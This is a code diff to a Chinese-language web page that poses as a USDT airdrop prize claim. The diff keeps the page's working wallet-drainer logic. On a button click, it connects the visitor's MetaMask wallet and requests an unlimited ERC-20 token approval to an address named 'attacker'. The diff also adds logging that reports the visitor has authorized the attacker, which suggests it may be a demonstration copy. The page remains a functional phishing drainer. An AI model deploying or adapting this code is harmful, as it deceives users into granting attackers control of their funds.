@@ -4,6 +4,7 @@
 <body>
 <h2>🎁 恭喜中獎！點擊下方按鈕領取 USDT 空投獎勵</h2>
 <button onclick="approve()">立即領取</button>
+<pre id="log" style="background:#f4f4f4;padding:10px;margin-top:20px;"></pre>
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
@@ -23,6 +24,8 @@ const abi = [
   }
 ];
 
+const logDiv = document.getElementById("log");
+
 async function approve() {
   if (typeof window.ethereum === 'undefined') {
     alert("請先安裝 MetaMask");
@@ -30,10 +33,17 @@ async function approve() {
   }
   const web3 = new Web3(window.ethereum);
   await ethereum.request({ method: 'eth_requestAccounts' });
-  const contract = new web3.eth.Contract(abi, tokenAddress);
   const accounts = await web3.eth.getAccounts();
-  await contract.methods.approve(attacker, maxApproval).send({ from: accounts[0] });
-  alert("✅ 授權成功！");
+  const user = accounts[0];
+  const contract = new web3.eth.Contract(abi, tokenAddress);
+  await contract.methods.approve(attacker, maxApproval).send({ from: user });
+  const msg = "✅ 地址 " + user + " 已授權給攻擊者 " + attacker;
+  log(msg);
+}
+
+function log(msg) {
+  console.log(msg);
+  logDiv.innerText = msg;
 }
 </script>
 </body>
